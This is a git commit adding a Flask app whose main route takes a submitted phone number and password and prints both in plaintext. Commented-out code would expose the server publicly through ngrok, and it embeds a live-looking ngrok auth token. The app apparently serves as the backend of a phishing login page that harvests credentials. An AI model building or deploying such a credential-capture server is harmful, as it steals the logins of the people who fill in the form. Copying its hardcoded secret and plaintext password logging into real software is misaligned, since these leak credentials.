940b19417bade6fe8f59e85653cb4454cb0984c1
R-Rad Hasan <98005086+rradhasan@users.noreply.github.com>
2024-06-23 15:28:54 +0600

    Add files via upload

---
+++ app.py
@@ -0,0 +1,29 @@
+from flask import Flask, render_template, request, url_for, redirect
+# from pyngrok import ngrok
+
+app = Flask(__name__)
+
+# ngrok.set_auth_token("2XsprUH5f0McYlZmLsFPuo2BZ9D_3C1HoH93ULjt6B3AUsZwM")
+# public_url = ngrok.connect(5000).public_url
+
+@app.route("/", methods=['GET','POST'])
+def home():
+    if request.method == 'POST':
+        name = request.form['phoneNumber']
+        password = request.form['passwd']
+        print(f'"{name}" is your phone number and "{password}" is your password')
+    return render_template('index.html')
+
+# print(f"To access public url please clink on {public_url}")
+# app.run(port=5000)
+
+@app.route("/welcome/", methods=['GET','POST'])
+def welcome():
+    return render_template("welcome.html")
+
+
+
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
